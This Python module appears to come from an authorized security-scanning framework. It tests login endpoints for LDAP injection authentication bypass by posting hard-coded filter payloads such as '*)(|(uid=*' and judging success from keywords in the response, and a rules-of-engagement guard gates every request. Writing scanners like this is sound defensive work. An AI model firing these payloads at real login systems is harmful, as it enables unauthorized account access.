from __future__ import annotations

from ..config import load_engine
from ..contract import Capability, ScanResult
from ..roe_guard import ROEGuard, ROEViolation
from .. import http as _http
from ..util import any_handler_reached, unreached_reason


CAPABILITY = Capability(
    name="ldap_scan",
    description="LDAP injection via auth bypass operators.",
    category="injection",
    cost="medium",
    destructive=False,
    idempotent=True,
)

LDAP_PAYLOADS = [
    ("and_true", "*)(uid=*", "*)(|(uid=*"),
    ("or_true", "*)(|(uid=*", "*)(|(uid=*"),
    ("close_true", "*)(&", "*)(&"),
    ("wildcard", "*", "*"),
]

FAIL_MARKERS = ("invalid", "incorrect", "failed", "unauthorized",
                "bad credentials", "wrong")
SUCCESS_MARKERS = ("token", "session", "authenticated", "welcome",
                    "success", "logged in")


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="POST"):
    if guard is None:
        try:
            guard = ROEGuard(engine_cfg=load_engine())
        except Exception as e:
            return f"ROE guard unavailable (fail-closed): {e}"
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _post(url, body, headers, timeout, verify, roe_guard):
    viol = _roe_block(roe_guard, url, "POST")
    if viol:
        return {"blocked": True, "error": f"ROE_BLOCK: {viol}"}
    try:
        with _http.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            r = c.post(url, json=body, headers=headers or {})
        return {"status": r.status_code, "body": (r.text or "")[:2000]}
    except Exception as e:
        return {"status": None, "error": f"{type(e).__name__}: {e}"}


def _is_failure(resp):
    if not resp:
        return True
    body = (resp.get("body") or "").lower()
    return any(m in body for m in FAIL_MARKERS)


def _is_success(resp):
    if not resp or resp.get("status") not in (200, 201, 202):
        return False
    body = (resp.get("body") or "").lower()
    if any(m in body for m in FAIL_MARKERS):
        return False
    return any(m in body for m in SUCCESS_MARKERS)


def scan(login_url, headers=None, roe_guard=None, timeout=8,
         username_field="username", password_field="password"):
    verify = _verify_tls()
    baseline = _post(login_url,
                     {username_field: "nonexistent_sec_checker",
                      password_field: "wrong_pass_xyz"},
                     headers, timeout, verify, roe_guard)
    if baseline.get("blocked"):
        return ScanResult(
            capability="ldap_scan", target=login_url,
            verdict="UNKNOWN", reason=baseline["error"],
        )
    if baseline.get("error"):
        return ScanResult(
            capability="ldap_scan", target=login_url,
            verdict="UNKNOWN", reason=baseline["error"],
        )
    attempts = []
    findings = []
    for label, user_payload, pass_payload in LDAP_PAYLOADS:
        body = {username_field: user_payload, password_field: pass_payload}
        r = _post(login_url, body, headers, timeout, verify, roe_guard)
        if r.get("blocked"):
            return ScanResult(
                capability="ldap_scan", target=login_url,
                verdict="UNKNOWN", reason=r["error"],
            )
        attempts.append({"payload": label, "status": r.get("status")})
        if _is_success(r) and _is_failure(baseline):
            findings.append({"payload": label})
            break
    if findings:
        return ScanResult(
            capability="ldap_scan", target=login_url,
            verdict="VULNERABLE", severity="high",
            reason=f"LDAP auth bypass via {findings[0]['payload']}",
            evidence={"findings": findings, "attempts": attempts},
        )
    if not any_handler_reached(attempts):
        return ScanResult(
            capability="ldap_scan", target=login_url,
            verdict="UNKNOWN", reason=unreached_reason(attempts),
            evidence={"attempts": attempts},
        )
    return ScanResult(
        capability="ldap_scan", target=login_url,
        verdict="PASS", severity="low",
        reason=f"no LDAP bypass across {len(attempts)} attempts",
    )
